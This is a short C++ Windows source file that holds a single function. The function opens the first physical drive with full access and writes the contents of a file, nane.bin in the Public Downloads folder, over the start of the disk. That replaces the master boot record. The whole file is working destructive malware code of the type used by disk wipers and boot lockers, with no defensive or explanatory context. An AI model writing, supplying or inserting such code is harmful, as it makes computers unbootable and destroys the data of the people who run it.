#include <Windows.h> 

int MBR() {
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    HANDLE binary = CreateFileW(L"C:\\Users\\Public\\Downloads\\nane.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);

    DWORD size = GetFileSize(binary, 0);
    byte* new_mbr = new byte[size];
    DWORD bytes_read;
    
    ReadFile(binary, new_mbr, size, &bytes_read, 0);
    WriteFile(drive, new_mbr, size, &bytes_read, 0);

    CloseHandle(binary);
    CloseHandle(drive);

    return 0;
}
